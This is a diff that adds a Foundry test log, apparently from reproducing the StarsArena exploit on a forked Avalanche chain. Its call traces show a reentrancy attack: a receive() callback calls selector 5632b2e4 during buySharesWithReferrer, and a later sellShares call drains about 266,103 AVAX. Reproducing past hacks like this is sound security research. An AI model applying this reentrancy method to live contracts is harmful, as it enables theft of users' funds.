@@ -1,0 +1,72 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/StarsArena_exp.sol:ContractTest
+[PASS] testExploit() (gas: 268168)
+Logs:
+  Attacker AVAX balance before exploit: 1.000000000000000000
+  Attacker AVAX balance after exploit: 266103.972780000000000000
+
+Traces:
+  [3644] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("avalanche", 36136405 [3.613e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [340475] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18])
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker AVAX balance before exploit", val: 1000000000000000000 [1e18], decimals: 18)
+    ├─ [272475] 0xA481B139a1A654cA19d2074F174f17D7534e8CeC::buySharesWithReferrer{value: 1000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [265309] 0x8aF92C23a169B58c2E5AC656D8D8a23FC725080f::buySharesWithReferrer{value: 1000000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 120000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [119360] ContractTest::receive{value: 420000000000000}()
+    │   │   │   ├─ [112325] 0xA481B139a1A654cA19d2074F174f17D7534e8CeC::5632b2e4(000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00)
+    │   │   │   │   ├─ [111653] 0x8aF92C23a169B58c2E5AC656D8D8a23FC725080f::5632b2e4(000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00000000000000000000000000000000000000000000000000000000153005ce00) [delegatecall]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x976b55826506239ca8cd6a7df69ba076a9f0b03cf69782f3352ef62cc6058354: 0 → 1
+    │   │   │   │   │   │   @ 0xcec6dc01206cb73693ee8ca88cf17a85af9a623d3db7555bb20456a9a64ad926: 0 → 0x000000000000000000000000000000000000000000000000000000153005ce00
+    │   │   │   │   │   │   @ 0x9272e45202488a872e7d2c2333e0983513b3b4a7ca0c74baf14b762eee3ba2b9: 0 → 0x000000000000000000000000000000000000000000000000000000153005ce00
+    │   │   │   │   │   │   @ 0xc37f521f338700d32d555681463d27e13ab56c13211692f109a127b469edf71c: 0 → 0x000000000000000000000000000000000000000000000000000000153005ce00
+    │   │   │   │   │   │   @ 0x5dfbc587ab2fc560325500217342d4961191b2f8217b3bf95d9c8e3390d826e3: 0 → 0x000000000000000000000000000000000000000000000000000000153005ce00
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 31: 257 → 1
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [276] ContractTest::receive{value: 993400000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 60000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Trade(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : true, : 1, : 6000000000000000 [6e15], : 120000000000000 [1.2e14], : 420000000000000 [4.2e14], : 60000000000000 [6e13], : 1, : 14000000000000000 [1.4e16], : 1)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x463ae92040a5c19c32759a71807cb3f3bf301dcb0645ac484304dfa8c46740a6: 0 → 1
+    │   │   │   @ 0x4df00b5e2c833b5fa21261d0d7f7e5096aeba893cb507846519340fb8b652cf9: 0 → 1
+    │   │   │   @ 0x8888c6a85f114bd32317f70880e37b5e6dcbd9567a10935758df9d1e14258d8d: 0 → 1
+    │   │   │   @ 0x9a8a64108662a5c7fbdd83fc94ff0b482278819e6315e1cacadd4099096bb965: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [47487] 0xA481B139a1A654cA19d2074F174f17D7534e8CeC::sellShares(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   ├─ [46827] 0x8aF92C23a169B58c2E5AC656D8D8a23FC725080f::sellShares(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
+    │   │   ├─ [276] ContractTest::receive{value: 246899671200000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 5486659360000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [276] ContractTest::receive{value: 19203307760000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] 0x3e74a248b3d37FAa49db2c0C385b3cB59e3dE8bb::fallback{value: 2743329680000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Trade(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : false, : 1, : 274332968000000000000000 [2.743e23], : 5486659360000000000000 [5.486e21], : 19203307760000000000000 [1.92e22], : 2743329680000000000000 [2.743e21], : 0, : 274332968000000000000000 [2.743e23], : 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4df00b5e2c833b5fa21261d0d7f7e5096aeba893cb507846519340fb8b652cf9: 1 → 0
+    │   │   │   @ 0x463ae92040a5c19c32759a71807cb3f3bf301dcb0645ac484304dfa8c46740a6: 1 → 0
+    │   │   │   @ 0x9a8a64108662a5c7fbdd83fc94ff0b482278819e6315e1cacadd4099096bb965: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   @ 0x8888c6a85f114bd32317f70880e37b5e6dcbd9567a10935758df9d1e14258d8d: 1 → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker AVAX balance after exploit", val: 266103972780000000000000 [2.661e23], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.04s (3.04s CPU time)
+
+Ran 1 test suite in 5.93s (4.04s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
